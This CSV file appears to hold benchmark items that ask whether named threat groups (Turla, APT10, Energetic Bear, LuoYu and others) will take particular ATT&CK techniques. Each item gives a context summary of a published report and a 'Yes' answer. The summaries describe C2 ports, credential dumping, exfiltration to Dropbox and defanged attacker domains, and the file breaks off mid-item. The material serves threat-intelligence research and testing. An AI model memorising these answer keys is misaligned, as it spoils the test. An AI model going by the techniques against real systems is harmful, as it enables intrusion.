1204,251,251-Credential Access-T1187-Forced Authentication,"After compromising the Turkish energy company's website through a supply chain attack as part of a watering hole targeting Turkish critical infrastructure for initial access, is it likely that 'Energetic Bear' would harvest Microsoft SMB credentials through a redirected image URL to a file protocol as part of their credential access strategy?","Credential Access: The CTI report indicates that 'Energetic Bear' used SMB credential-harvesting malware as part of their credential access strategy. This was observed in the compromise of the Turkish energy company's website, where an image URL was modified to redirect to a file protocol, allowing the group to harvest Microsoft SMB credentials.","Reconnaissance: The CTI report details a campaign by the threat group 'Energetic Bear' involving strategic web compromises for reconnaissance purposes. The group, known for cyber espionage, targeted specific entities such as software suppliers for programmable logic controller (PLC) components used in critical infrastructure. They backdoored these with Havex malware. An example given is the compromise of the Turkish energy company Turcas Petrol's website, turcas.com.tr, which was injected with SMB credential-harvesting malware.
Initial Access: The CTI report describes an initial access technique used by 'Energetic Bear' where a Turkish energy company's website was compromised through a supply chain attack and used in a watering hole attack targeting individuals associated with Turkish critical infrastructure. The site was injected with SMB credential-harvesting malware to facilitate this access.
Others: The CTI report by RiskIQ provides insights into 'Energetic Bear's' broader targeting strategy beyond specific entities. General-purpose websites like plantengineering.com, serving as hubs for critical infrastructure sector information, were also compromised. The attackers had broad access to the server, indicating a definite pattern of targeting news and information websites for the industrial sector. RiskIQ's analysis suggests that the campaign started between the beginning of February and the end of March. The report emphasizes the increasing prevalence of supply-chain attacks and the need for site owners to inventory third-party code on their web assets to prevent becoming pawns in such operations.",Yes,New Insights into Energetic Bear's Attacks on Turkish Critical Infrastructure
1207,252,252-Command and Control-T1071-Application Layer Protocol,"After gathering system information such as systeminfo, tasklist, and arp through PyFlash backdoor as part of the discovery phase, is it likely that PyFlash will communicate with its hardcoded C&C server and utilize encryption via AES-128 in CBC mode on ports like 8,000 to facilitate command and control operations?","Command and Control: PyFlash communicates with its hardcoded C&C server via HTTP, using AES-128 in CBC mode to encrypt all network communications. NetFlash uses port 80 for communication, while PyFlash uses port 8,000, and another NetFlash sample uses port 15,363.","Initial Access: ESET researchers discovered a watering hole operation targeting Armenian websites, using a fake Adobe Flash update lure to deliver malware dubbed NetFlash and PyFlash. The operation is attributed to Turla, an espionage group targeting governmental and military organizations. Compromised websites include armconsul[.]ru, mnp.nkr[.]am, aiisa[.]am, and adgf[.]am, with some belonging to the Armenian government. The campaign involved inserting malicious JavaScript into these websites, such as appending obfuscated code to jquery-migrate.min.js on mnp.nkr[.]am. The malicious code would load external JavaScript from skategirlchina[.]com/wp-includes/data_from_db_top.php, which fingerprints the visitor's browser and potentially delivers a second-stage malicious JavaScript. The campaign ceased delivering malicious scripts by the end of November 2019.
Execution: The watering hole operation by Turla involved a social engineering trick with a fake Adobe Flash update warning to induce users to download and install malware. The fake installer, once executed, would install both a Turla malware variant and a legitimate Adobe Flash program, leading users to believe the update was legitimate.
Persistence: The NetFlash and PyFlash malware variants used by Turla establish persistence using Windows scheduled tasks. NetFlash downloads its second stage malware from a hardcoded URL and sets up a scheduled task for the new backdoor, while PyFlash persists by modifying the Windows task that regularly launches the malware.
Discovery: The PyFlash backdoor executes various OS-related commands such as systeminfo, tasklist, ipconfig, getmac, and arp to gather information about the machine and sends it to the C&C server.
Exfiltration: The output of PyFlash surveillance and C&C commands are exfiltrated using the C&C protocol.
Others: The Turla group has been active for over ten years, with previous campaigns including Mosquito and LightNeuron. The recent operation shares similarities with past Turla campaigns, particularly one uncovered in 2017. The JavaScript used in the current campaign is almost identical to that of the 2017 campaign, but with different targets and payloads. The operation relies on a well-known social engineering trick and has shifted payloads, likely to evade detection. The new payload, NetFlash, installs a backdoor called PyFlash, developed in Python. ESET will continue monitoring Turla activities and publish relevant information on their blog. Indicators of Compromise (IoCs) include compromised websites and C&C servers such as skategirlchina[.]com and various IP addresses. Samples of the malware with SHA-1 hashes and timestamps are also provided.",Yes,Tracking Turla_ New backdoor delivered via Armenian watering holes _ WeLiveSecurity
1208,252,252-Command and Control-T1573-Encrypted Channel,"After PyFlash executes various OS-related commands like systeminfo and ipconfig to gather machine information, is it likely that it will communicate with its hardcoded C&C server using AES-128 encryption in CBC mode for sending exfiltrated data?","Command and Control: PyFlash communicates with its hardcoded C&C server via HTTP, using AES-128 in CBC mode to encrypt all network communications. NetFlash uses port 80 for communication, while PyFlash uses port 8,000, and another NetFlash sample uses port 15,363.","Initial Access: ESET researchers discovered a watering hole operation targeting Armenian websites, using a fake Adobe Flash update lure to deliver malware dubbed NetFlash and PyFlash. The operation is attributed to Turla, an espionage group targeting governmental and military organizations. Compromised websites include armconsul[.]ru, mnp.nkr[.]am, aiisa[.]am, and adgf[.]am, with some belonging to the Armenian government. The campaign involved inserting malicious JavaScript into these websites, such as appending obfuscated code to jquery-migrate.min.js on mnp.nkr[.]am. The malicious code would load external JavaScript from skategirlchina[.]com/wp-includes/data_from_db_top.php, which fingerprints the visitor's browser and potentially delivers a second-stage malicious JavaScript. The campaign ceased delivering malicious scripts by the end of November 2019.
Execution: The watering hole operation by Turla involved a social engineering trick with a fake Adobe Flash update warning to induce users to download and install malware. The fake installer, once executed, would install both a Turla malware variant and a legitimate Adobe Flash program, leading users to believe the update was legitimate.
Persistence: The NetFlash and PyFlash malware variants used by Turla establish persistence using Windows scheduled tasks. NetFlash downloads its second stage malware from a hardcoded URL and sets up a scheduled task for the new backdoor, while PyFlash persists by modifying the Windows task that regularly launches the malware.
Discovery: The PyFlash backdoor executes various OS-related commands such as systeminfo, tasklist, ipconfig, getmac, and arp to gather information about the machine and sends it to the C&C server.
Exfiltration: The output of PyFlash surveillance and C&C commands are exfiltrated using the C&C protocol.
Others: The Turla group has been active for over ten years, with previous campaigns including Mosquito and LightNeuron. The recent operation shares similarities with past Turla campaigns, particularly one uncovered in 2017. The JavaScript used in the current campaign is almost identical to that of the 2017 campaign, but with different targets and payloads. The operation relies on a well-known social engineering trick and has shifted payloads, likely to evade detection. The new payload, NetFlash, installs a backdoor called PyFlash, developed in Python. ESET will continue monitoring Turla activities and publish relevant information on their blog. Indicators of Compromise (IoCs) include compromised websites and C&C servers such as skategirlchina[.]com and various IP addresses. Samples of the malware with SHA-1 hashes and timestamps are also provided.",Yes,Tracking Turla_ New backdoor delivered via Armenian watering holes _ WeLiveSecurity
1209,252,252-Command and Control-T1571-Non-Standard Port,"After PyFlash backdoor gathers OS-related information on the infected machine and sends it to the C&C server, is it likely that NetFlash and PyFlash will utilize ports 80, 8,000, and 15,363 for communicating with their respective C&C servers using encrypted network traffic?","Command and Control: PyFlash communicates with its hardcoded C&C server via HTTP, using AES-128 in CBC mode to encrypt all network communications. NetFlash uses port 80 for communication, while PyFlash uses port 8,000, and another NetFlash sample uses port 15,363.","Initial Access: ESET researchers discovered a watering hole operation targeting Armenian websites, using a fake Adobe Flash update lure to deliver malware dubbed NetFlash and PyFlash. The operation is attributed to Turla, an espionage group targeting governmental and military organizations. Compromised websites include armconsul[.]ru, mnp.nkr[.]am, aiisa[.]am, and adgf[.]am, with some belonging to the Armenian government. The campaign involved inserting malicious JavaScript into these websites, such as appending obfuscated code to jquery-migrate.min.js on mnp.nkr[.]am. The malicious code would load external JavaScript from skategirlchina[.]com/wp-includes/data_from_db_top.php, which fingerprints the visitor's browser and potentially delivers a second-stage malicious JavaScript. The campaign ceased delivering malicious scripts by the end of November 2019.
Execution: The watering hole operation by Turla involved a social engineering trick with a fake Adobe Flash update warning to induce users to download and install malware. The fake installer, once executed, would install both a Turla malware variant and a legitimate Adobe Flash program, leading users to believe the update was legitimate.
Persistence: The NetFlash and PyFlash malware variants used by Turla establish persistence using Windows scheduled tasks. NetFlash downloads its second stage malware from a hardcoded URL and sets up a scheduled task for the new backdoor, while PyFlash persists by modifying the Windows task that regularly launches the malware.
Discovery: The PyFlash backdoor executes various OS-related commands such as systeminfo, tasklist, ipconfig, getmac, and arp to gather information about the machine and sends it to the C&C server.
Exfiltration: The output of PyFlash surveillance and C&C commands are exfiltrated using the C&C protocol.
Others: The Turla group has been active for over ten years, with previous campaigns including Mosquito and LightNeuron. The recent operation shares similarities with past Turla campaigns, particularly one uncovered in 2017. The JavaScript used in the current campaign is almost identical to that of the 2017 campaign, but with different targets and payloads. The operation relies on a well-known social engineering trick and has shifted payloads, likely to evade detection. The new payload, NetFlash, installs a backdoor called PyFlash, developed in Python. ESET will continue monitoring Turla activities and publish relevant information on their blog. Indicators of Compromise (IoCs) include compromised websites and C&C servers such as skategirlchina[.]com and various IP addresses. Samples of the malware with SHA-1 hashes and timestamps are also provided.",Yes,Tracking Turla_ New backdoor delivered via Armenian watering holes _ WeLiveSecurity
1211,252,252-Discovery-T1082-System Information Discovery,"After establishing persistence via Windows scheduled tasks and installing second-stage malware such as PyFlash or NetFlash, is it likely that Turla will use the PyFlash backdoor to execute commands like systeminfo, tasklist, ipconfig, getmac, and arp before sending the gathered information to its C&C server?","Discovery: The PyFlash backdoor executes various OS-related commands such as systeminfo, tasklist, ipconfig, getmac, and arp to gather information about the machine and sends it to the C&C server.","Initial Access: ESET researchers discovered a watering hole operation targeting Armenian websites, using a fake Adobe Flash update lure to deliver malware dubbed NetFlash and PyFlash. The operation is attributed to Turla, an espionage group targeting governmental and military organizations. Compromised websites include armconsul[.]ru, mnp.nkr[.]am, aiisa[.]am, and adgf[.]am, with some belonging to the Armenian government. The campaign involved inserting malicious JavaScript into these websites, such as appending obfuscated code to jquery-migrate.min.js on mnp.nkr[.]am. The malicious code would load external JavaScript from skategirlchina[.]com/wp-includes/data_from_db_top.php, which fingerprints the visitor's browser and potentially delivers a second-stage malicious JavaScript. The campaign ceased delivering malicious scripts by the end of November 2019.
Execution: The watering hole operation by Turla involved a social engineering trick with a fake Adobe Flash update warning to induce users to download and install malware. The fake installer, once executed, would install both a Turla malware variant and a legitimate Adobe Flash program, leading users to believe the update was legitimate.
Persistence: The NetFlash and PyFlash malware variants used by Turla establish persistence using Windows scheduled tasks. NetFlash downloads its second stage malware from a hardcoded URL and sets up a scheduled task for the new backdoor, while PyFlash persists by modifying the Windows task that regularly launches the malware.
Command and Control: PyFlash communicates with its hardcoded C&C server via HTTP, using AES-128 in CBC mode to encrypt all network communications. NetFlash uses port 80 for communication, while PyFlash uses port 8,000, and another NetFlash sample uses port 15,363.
Exfiltration: The output of PyFlash surveillance and C&C commands are exfiltrated using the C&C protocol.
Others: The Turla group has been active for over ten years, with previous campaigns including Mosquito and LightNeuron. The recent operation shares similarities with past Turla campaigns, particularly one uncovered in 2017. The JavaScript used in the current campaign is almost identical to that of the 2017 campaign, but with different targets and payloads. The operation relies on a well-known social engineering trick and has shifted payloads, likely to evade detection. The new payload, NetFlash, installs a backdoor called PyFlash, developed in Python. ESET will continue monitoring Turla activities and publish relevant information on their blog. Indicators of Compromise (IoCs) include compromised websites and C&C servers such as skategirlchina[.]com and various IP addresses. Samples of the malware with SHA-1 hashes and timestamps are also provided.",Yes,Tracking Turla_ New backdoor delivered via Armenian watering holes _ WeLiveSecurity
1219,254,254-Collection-T1560-Archive Collected Data,"After accessing Visma's Microsoft Active Directory domain controller using Mimikatz for credential theft, is APT10 likely to compress proprietary data from Visma using WinRAR before exfiltrating this data to a Dropbox account via the cURL for Windows command-line tool?",Collection: APT10 compressed proprietary data from Visma using WinRAR and exfiltrated to a Dropbox account using the cURL for Windows command-line tool.,"Initial Access: The attackers gained access to networks through deployments of Citrix and LogMeIn remote-access software using stolen valid user credentials.
Execution: APT10 deployed Trochilus malware with command and control (C2) communications encrypted using both RC4 and Salsa20 streaming ciphers. They also deployed a unique version of the UPPERCUT (ANEL) backdoor, known to have only been used by APT10.
Privilege Escalation: The attackers conducted privilege escalation on the victim networks, utilizing DLL sideloading techniques to deliver malware.
Defense Evasion: APT10 utilized DLL sideloading by executing a legitimate binary to load a renamed malicious DLL that decrypts, decompresses, and injects a Trochilus payload into memory.
Credential Access: The attackers used Mimikatz to enable credential theft and accessed Visma's Microsoft Active Directory domain controller, deploying Trochilus and copying the NTDS.DIT database file containing password hashes for all users in the domain.
Lateral Movement: APT10 regularly logged in to the Visma network via accessible Citrix servers using two valid user accounts. The times of the logins were consistent with a GMT+8 timezone, indicative of typical Tianjin, China working hours.
Command and Control: The Trochilus malware C2 communications were encrypted using a combination of RC4 and Salsa20 stream ciphers. The C2 domain www.miphomanager[.]com was used for communication.
Exfiltration: The attackers employed custom malware that used Dropbox as its C2 and used WinRAR and cURL for Windows to compress and upload the exfiltrated files from the Visma network to the Dropbox API.",Yes,APT10 Targeted Norwegian MSP and US Companies in Sustained Campaign
1221,254,254-Exfiltration-T1567-Exfiltration Over Web Service,"After compressing proprietary data from Visma using WinRAR in the Collection phase, is it likely that the attackers will use custom malware to exfiltrate files to Dropbox and employ cURL for Windows to upload the exfiltrated files during the Exfiltration phase?",Exfiltration: The attackers employed custom malware that used Dropbox as its C2 and used WinRAR and cURL for Windows to compress and upload the exfiltrated files from the Visma network to the Dropbox API.,"Initial Access: The attackers gained access to networks through deployments of Citrix and LogMeIn remote-access software using stolen valid user credentials.
Execution: APT10 deployed Trochilus malware with command and control (C2) communications encrypted using both RC4 and Salsa20 streaming ciphers. They also deployed a unique version of the UPPERCUT (ANEL) backdoor, known to have only been used by APT10.
Privilege Escalation: The attackers conducted privilege escalation on the victim networks, utilizing DLL sideloading techniques to deliver malware.
Defense Evasion: APT10 utilized DLL sideloading by executing a legitimate binary to load a renamed malicious DLL that decrypts, decompresses, and injects a Trochilus payload into memory.
Credential Access: The attackers used Mimikatz to enable credential theft and accessed Visma's Microsoft Active Directory domain controller, deploying Trochilus and copying the NTDS.DIT database file containing password hashes for all users in the domain.
Lateral Movement: APT10 regularly logged in to the Visma network via accessible Citrix servers using two valid user accounts. The times of the logins were consistent with a GMT+8 timezone, indicative of typical Tianjin, China working hours.
Collection: APT10 compressed proprietary data from Visma using WinRAR and exfiltrated to a Dropbox account using the cURL for Windows command-line tool.
Command and Control: The Trochilus malware C2 communications were encrypted using a combination of RC4 and Salsa20 stream ciphers. The C2 domain www.miphomanager[.]com was used for communication.",Yes,APT10 Targeted Norwegian MSP and US Companies in Sustained Campaign
1222,254,254-Credential Access-T1003-OS Credential Dumping,"After escalating privileges using DLL sideloading techniques and evading defenses by loading a malicious DLL to inject Trochilus payloads into memory, is it likely that APT10 will use Mimikatz to enable credential theft, access Visma's Microsoft Active Directory domain controller, and deploy Trochilus to copy the NTDS.DIT database file containing password hashes for all users in the domain?","Credential Access: The attackers used Mimikatz to enable credential theft and accessed Visma's Microsoft Active Directory domain controller, deploying Trochilus and copying the NTDS.DIT database file containing password hashes for all users in the domain.","Initial Access: The attackers gained access to networks through deployments of Citrix and LogMeIn remote-access software using stolen valid user credentials.
Execution: APT10 deployed Trochilus malware with command and control (C2) communications encrypted using both RC4 and Salsa20 streaming ciphers. They also deployed a unique version of the UPPERCUT (ANEL) backdoor, known to have only been used by APT10.
Privilege Escalation: The attackers conducted privilege escalation on the victim networks, utilizing DLL sideloading techniques to deliver malware.
Defense Evasion: APT10 utilized DLL sideloading by executing a legitimate binary to load a renamed malicious DLL that decrypts, decompresses, and injects a Trochilus payload into memory.
Lateral Movement: APT10 regularly logged in to the Visma network via accessible Citrix servers using two valid user accounts. The times of the logins were consistent with a GMT+8 timezone, indicative of typical Tianjin, China working hours.
Collection: APT10 compressed proprietary data from Visma using WinRAR and exfiltrated to a Dropbox account using the cURL for Windows command-line tool.
Command and Control: The Trochilus malware C2 communications were encrypted using a combination of RC4 and Salsa20 stream ciphers. The C2 domain www.miphomanager[.]com was used for communication.
Exfiltration: The attackers employed custom malware that used Dropbox as its C2 and used WinRAR and cURL for Windows to compress and upload the exfiltrated files from the Visma network to the Dropbox API.",Yes,APT10 Targeted Norwegian MSP and US Companies in Sustained Campaign
1223,254,254-Lateral Movement-T1021-Remote Services,"After using Mimikatz to enable credential theft and accessing Visma's Microsoft Active Directory domain controller to deploy Trochilus and copy the NTDS.DIT database file, is it likely that APT10 will log in to the Visma network via Citrix servers using valid user accounts and exhibit logins consistent with Tianjin, China working hours for lateral movement?","Lateral Movement: APT10 regularly logged in to the Visma network via accessible Citrix servers using two valid user accounts. The times of the logins were consistent with a GMT+8 timezone, indicative of typical Tianjin, China working hours.","Initial Access: The attackers gained access to networks through deployments of Citrix and LogMeIn remote-access software using stolen valid user credentials.
Execution: APT10 deployed Trochilus malware with command and control (C2) communications encrypted using both RC4 and Salsa20 streaming ciphers. They also deployed a unique version of the UPPERCUT (ANEL) backdoor, known to have only been used by APT10.
Privilege Escalation: The attackers conducted privilege escalation on the victim networks, utilizing DLL sideloading techniques to deliver malware.
Defense Evasion: APT10 utilized DLL sideloading by executing a legitimate binary to load a renamed malicious DLL that decrypts, decompresses, and injects a Trochilus payload into memory.
Credential Access: The attackers used Mimikatz to enable credential theft and accessed Visma's Microsoft Active Directory domain controller, deploying Trochilus and copying the NTDS.DIT database file containing password hashes for all users in the domain.
Collection: APT10 compressed proprietary data from Visma using WinRAR and exfiltrated to a Dropbox account using the cURL for Windows command-line tool.
Command and Control: The Trochilus malware C2 communications were encrypted using a combination of RC4 and Salsa20 stream ciphers. The C2 domain www.miphomanager[.]com was used for communication.
Exfiltration: The attackers employed custom malware that used Dropbox as its C2 and used WinRAR and cURL for Windows to compress and upload the exfiltrated files from the Visma network to the Dropbox API.",Yes,APT10 Targeted Norwegian MSP and US Companies in Sustained Campaign
1229,255,255-Command and Control-T1090-Proxy,"After POWERSHOWER collects system information on the infected machine and sends it to the C2 server, is it likely that it will communicate with the C2 server and enter a communications loop as part of maintaining Command and Control?","Command and Control: POWERSHOWER communicates with a C2 server, sending system information and receiving instructions. It enters a communications loop after a reboot, performing actions based on the status code of a GET request.","Reconnaissance: The Inception attackers have been active since at least 2014, targeting a variety of industries, primarily in Russia, but also globally. They use a two-stage spear phishing process, initially sending a reconnaissance spear phish to gather information, followed by a second spear phish containing a remote template to deliver a payload.
Initial Access: The Inception attackers exploit a year-old Office vulnerability, CVE-2017-11882, to gain initial access to European targets. They use remote templates in Microsoft Word, which allows them to load an external template when the document is opened.
Execution: The Inception attackers deploy a PowerShell backdoor named POWERSHOWER, which cleans up forensic evidence after itself. It is used to fingerprint the machine, upload information to the C&C, and potentially run a secondary payload.
Persistence: POWERSHOWER sets up persistence by writing itself to %AppData%\Microsoft\Word\log.ps1 and using a run key in the registry.
Defense Evasion: The Inception attackers use anti-forensics techniques during the dropper process to prevent clues from being left on disk or in the registry. They also use a basic backdoor, POWERSHOWER, as a first stage to make it harder for researchers to analyze more sophisticated payloads.
Discovery: POWERSHOWER collects system information on the infected machine and sends it to the C2 server.
Others: Palo Alto Networks' Wildfire detects all current Inception remote template documents and the downloaded CVE-2017-11882 RTFs with malware verdicts. AutoFocus customers can track associated samples with the InceptionRemoteTemplate and PowerShower. Traps blocks all files associated with this campaign. Indicators of Compromise include various remote template documents, PowerShower samples, and IP addresses associated with Inception Remote Template documents.",Yes,Inception Attackers Target Europe with Year-old Office Vulnerability
1233,256,256-Defense Evasion-T1574-Hijack Execution Flow,"After using spear-phishing emails and potentially exploiting vulnerable Microsoft Office applications for gaining initial access, is PKPLUG likely to use DLL side-loading for persistence before employing legitimate, signed applications to launch malicious payloads as a method of defense evasion?","Defense Evasion: PKPLUG employs DLL side-loading to launch malicious payloads via legitimate, signed applications, which is a method of defense evasion. This technique allows the group to avoid detection by security software.","Initial Access: PKPLUG, a cyber espionage group, has been using spear-phishing emails to deliver payloads to victims, which is a popular tactic for gaining initial access. Some email attachments contained exploits for vulnerable Microsoft Office applications, but this technique was less commonly used compared to social engineering to lure victims into opening attachments.
Persistence: DLL side-loading is almost ubiquitous as a method to install or run payloads for PKPLUG, indicating a persistence mechanism. Additionally, PowerShell and PowerSploit are also being considered for maintaining persistence.
Command and Control: PKPLUG's campaigns have been documented to use various Command and Control (C2) infrastructures, including domain names and IP addresses that are reused across different campaigns. This allows the group to communicate with and control compromised systems.
Others: PKPLUG has been active for at least six years, using a variety of malware families, including PlugX, Poison Ivy, Zupdax, 9002, HenBox, and Farseer. The group targets countries and regions in and around Southeast Asia, with potential motivations related to the ASEAN organization, China's Belt and Road Initiative, and disputes over the South China Sea. Unit 42 of Palo Alto Networks has been tracking PKPLUG for three years and believes with high confidence that it has origins linked to Chinese nation-state adversaries. The group's use of Android malware indicates an intent to target environments where traditional computing and communication methods differ.",Yes,PKPLUG_ Chinese Cyber Espionage Group Attacking Asia
1238,257,257-Command and Control-T1568-Dynamic Resolution,"After maintaining persistence through the registry's RUN key, is it likely that WinDealer will use an IP generation algorithm for Command and Control, communicating with randomly selected machines within specific IP ranges?","Command and Control: The latest WinDealer sample discovered in 2020 uses a complex IP generation algorithm to contact machines randomly selected from specific IP ranges within AS4134. Communication occurs over UDP port 6999 or TCP port 55556. An additional sample communicates with a hardcoded URL that is invalid under normal circumstances, suggesting the existence of a man-on-the-side attacker intercepting and modifying network traffic.","Initial Access: In 2020, a new distribution method for WinDealer malware was discovered, leveraging the automatic update mechanism of certain legitimate applications. A signed executable, qgametool.exe, compiled in 2012, was found to deploy WinDealer on a target machine by checking for updates from a hardcoded URL. Occasionally, a WinDealer sample was delivered instead of the benign executable. Chinese-speaking users reported finding malware named PPTV(pplive)_forap_1084_9993.exe on their machines, which was confirmed to be a sample of WinDealer.
Execution: WinDealer is a modular malware platform that begins execution by locating an embedded DLL file in its resources, decoding it with a 10-byte XOR key. The malware's logic is divided between the initial EXE and the companion DLL, with capabilities including file manipulation, information gathering, arbitrary file download/upload, command execution, system-wide search, screenshot capture, network discovery, and backdoor maintenance.
Persistence: WinDealer maintains persistence through the registry's RUN key, allowing for configuration updates.
Discovery: WinDealer targets popular applications in Asia, such as QQ, WeChat, and WangWang, and references registry keys created by Sogou programs, indicating a focus on Chinese-speaking targets and organizations related to China.
Others: LuoYu, active since 2008, primarily targets entities in China, including foreign diplomatic organizations, academic community members, and companies from defense, logistics, and telecommunications sectors. Kaspersky and TeamT5 confirmed the connection between Demsty and WinDealer. LuoYu can perform man-on-the-side attacks, intercepting network traffic and modifying it if needed, with capabilities similar to the QUANTUM program. The majority of LuoYu targets are in China, with occasional infections in other countries. LuoYu has recently expanded its scope to East Asia. The attackers may have compromised routers or use unknown signals intelligence methods, potentially accessing law enforcement tools at the ISP level. Defending against such intrusions requires vigilance, regular antivirus scans, analysis of outbound network traffic, and extensive logging.",Yes,WinDealer dealing on the side _ Securelist
1239,257,257-Command and Control-T1095-Non-Application Layer Protocol,"After leveraging legitimate application's automatic update mechanism to deliver WinDealer malware during initial access and maintaining persistence through the registry's RUN key for configuration updates, is it likely that WinDealer will use UDP port 6999 and TCP port 55556 for Command and Control communication?","Command and Control: The latest WinDealer sample discovered in 2020 uses a complex IP generation algorithm to contact machines randomly selected from specific IP ranges within AS4134. Communication occurs over UDP port 6999 or TCP port 55556. An additional sample communicates with a hardcoded URL that is invalid under normal circumstances, suggesting the existence of a man-on-the-side attacker intercepting and modifying network traffic.","Initial Access: In 2020, a new distribution method for WinDealer malware was discovered, leveraging the automatic update mechanism of certain legitimate applications. A signed executable, qgametool.exe, compiled in 2012, was found to deploy WinDealer on a target machine by checking for updates from a hardcoded URL. Occasionally, a WinDealer sample was delivered instead of the benign executable. Chinese-speaking users reported finding malware named PPTV(pplive)_forap_1084_9993.exe on their machines, which was confirmed to be a sample of WinDealer.
Execution: WinDealer is a modular malware platform that begins execution by locating an embedded DLL file in its resources, decoding it with a 10-byte XOR key. The malware's logic is divided between the initial EXE and the companion DLL, with capabilities including file manipulation, information gathering, arbitrary file download/upload, command execution, system-wide search, screenshot capture, network discovery, and backdoor maintenance.
Persistence: WinDealer maintains persistence through the registry's RUN key, allowing for configuration updates.
Discovery: WinDealer targets popular applications in Asia, such as QQ, WeChat, and WangWang, and references registry keys created by Sogou programs, indicating a focus on Chinese-speaking targets and organizations related to China.
Others: LuoYu, active since 2008, primarily targets entities in China, including foreign diplomatic organizations, academic community members, and companies from defense, logistics, and telecommunications sectors. Kaspersky and TeamT5 confirmed the connection between Demsty and WinDealer. LuoYu can perform man-on-the-side attacks, intercepting network traffic and modifying it if needed, with capabilities similar to the QUANTUM program. The majority of LuoYu targets are in China, with occasional infections in other countries. LuoYu has recently expanded its scope to East Asia. The attackers may have compromised routers or use unknown signals intelligence methods, potentially accessing law enforcement tools at the ISP level. Defending against such intrusions requires vigilance, regular antivirus scans, analysis of outbound network traffic, and extensive logging.",Yes,WinDealer dealing on the side _ Securelist
1240,257,257-Command and Control-T1659-Content Injection,"After maintaining persistence through the registry's RUN key for configuration updates, is it likely that WinDealer will communicate with a hardcoded URL using a man-on-the-side attack for command and control?","Command and Control: The latest WinDealer sample discovered in 2020 uses a complex IP generation algorithm to contact machines randomly selected from specific IP ranges within AS4134. Communication occurs over UDP port 6999 or TCP port 55556. An additional sample communicates with a hardcoded URL that is invalid under normal circumstances, suggesting the existence of a man-on-the-side attacker intercepting and modifying network traffic.","Initial Access: In 2020, a new distribution method for WinDealer malware was discovered, leveraging the automatic update mechanism of certain legitimate applications. A signed executable, qgametool.exe, compiled in 2012, was found to deploy WinDealer on a target machine by checking for updates from a hardcoded URL. Occasionally, a WinDealer sample was delivered instead of the benign executable. Chinese-speaking users reported finding malware named PPTV(pplive)_forap_1084_9993.exe on their machines, which was confirmed to be a sample of WinDealer.
Execution: WinDealer is a modular malware platform that begins execution by locating an embedded DLL file in its resources, decoding it with a 10-byte XOR key. The malware's logic is divided between the initial EXE and the companion DLL, with capabilities including file manipulation, information gathering, arbitrary file download/upload, command execution, system-wide search, screenshot capture, network discovery, and backdoor maintenance.
Persistence: WinDealer maintains persistence through the registry's RUN key, allowing for configuration updates.
Discovery: WinDealer targets popular applications in Asia, such as QQ, WeChat, and WangWang, and references registry keys created by Sogou programs, indicating a focus on Chinese-speaking targets and organizations related to China.
Others: LuoYu, active since 2008, primarily targets entities in China, including foreign diplomatic organizations, academic community members, and companies from defense, logistics, and telecommunications sectors. Kaspersky and TeamT5 confirmed the connection between Demsty and WinDealer. LuoYu can perform man-on-the-side attacks, intercepting network traffic and modifying it if needed, with capabilities similar to the QUANTUM program. The majority of LuoYu targets are in China, with occasional infections in other countries. LuoYu has recently expanded its scope to East Asia. The attackers may have compromised routers or use unknown signals intelligence methods, potentially accessing law enforcement tools at the ISP level. Defending against such intrusions requires vigilance, regular antivirus scans, analysis of outbound network traffic, and extensive logging.",Yes,WinDealer dealing on the side _ Securelist
1243,258,258-Command and Control-T1102-Web Service,"After checking the system's keyboard layout to target Arabic-speaking countries including Saudi Arabia, Iraq, and Egypt, is it likely that JhoneRAT will use cloud services for command and control operations by checking for new commands in tweets from a specific Twitter handle?",Command and Control: JhoneRAT uses cloud services for command and control activities. It checks for new commands in tweets from the handle @jhone87438316 every 10 seconds using BeautifulSoup. Commands can be issued to specific victims based on a UID generated on each target or to all victims.,"Initial Access: The JhoneRAT campaign begins with malicious Microsoft Office documents that are designed to download an additional Office document containing a Macro. These documents are hosted on Google Drive. The earliest document, named 'Urgent.docx' from November 2019, prompts users to enable editing in English and Arabic. Another document named 'fb.docx' from early January contains alleged Facebook usernames and passwords. A more recent document from mid-January appears to be from a United Arab Emirates organization and asks users to enable editing to view blurred content.
Execution: The malicious Office document's Macro executes only if a disk serial number is detected, which is a technique to avoid virtual machine detection. The Macro then downloads an image from Google Drive, which contains a base64-encoded binary appended at the end, separated by the string '****'. The binary is an AutoIT script that downloads a new file from Google Drive.
Persistence: The final payload, JhoneRAT, written in Python, creates persistence by adding an entry named 'ChromeUpdater' to the 'Software\Microsoft\Windows\CurrentVersion\Run' registry key.
Defense Evasion: JhoneRAT includes techniques to avoid execution on virtual machines by checking for disk serial numbers. Additionally, the Python bytecode header is removed to hinder analysis by tools such as uncompyle6.
Discovery: JhoneRAT checks the system's keyboard layout to target specific Arabic-speaking countries, including Saudi Arabia, Iraq, Egypt, Libya, Algeria, Morocco, Tunisia, Oman, Yemen, Syria, UAE, Kuwait, Bahrain, and Lebanon.
Exfiltration: JhoneRAT exfiltrates screenshots via ImgBB and sends command execution feedback to Google Forms. It can also download files encoded in base64 from Google Drive.
Others: The JhoneRAT campaign is focused on specific Middle Eastern and Arabic-speaking countries and leverages cloud providers for operations. The campaign started in November 2019 and is ongoing. The attackers have implemented anti-VM and anti-analysis tricks. The campaign demonstrates the importance of network-based detection complemented by system behavior analysis. The threat actors' infrastructure includes URLs hosted on Google Drive and a Twitter account. Cisco Talos Intelligence Group provides various ways to detect and block this threat, including Advanced Malware Protection (AMP), Cisco Cloud Web Security (CWS), Email Security, Network Security appliances, AMP Threat Grid, Umbrella, and the Open Source Snort Subscriber Rule Set.",Yes,JhoneRAT_ Cloud based python RAT targeting Middle Eastern countries
1247,258,258-Exfiltration-T1567-Exfiltration Over Web Service,"After JhoneRAT uses cloud services like Twitter to check for new commands for command and control activities, is it likely to exfiltrate screenshots via ImgBB and send command execution feedback to Google Forms for exfiltration purposes?",Exfiltration: JhoneRAT exfiltrates screenshots via ImgBB and sends command execution feedback to Google Forms. It can also download files encoded in base64 from Google Drive.,"Initial Access: The JhoneRAT campaign begins with malicious Microsoft Office documents that are designed to download an additional Office document containing a Macro. These documents are hosted on Google Drive. The earliest document, named 'Urgent.docx' from November 2019, prompts users to enable editing in English and Arabic. Another document named 'fb.docx' from early January contains alleged Facebook usernames and passwords. A more recent document from mid-January appears to be from a United Arab Emirates organization and asks users to enable editing to view blurred content.
Execution: The malicious Office document's Macro executes only if a disk serial number is detected, which is a technique to avoid virtual machine detection. The Macro then downloads an image from Google Drive, which contains a base64-encoded binary appended at the end, separated by the string '****'. The binary is an AutoIT script that downloads a new file from Google Drive.
Persistence: The final payload, JhoneRAT, written in Python, creates persistence by adding an entry named 'ChromeUpdater' to the 'Software\Microsoft\Windows\CurrentVersion\Run' registry key.
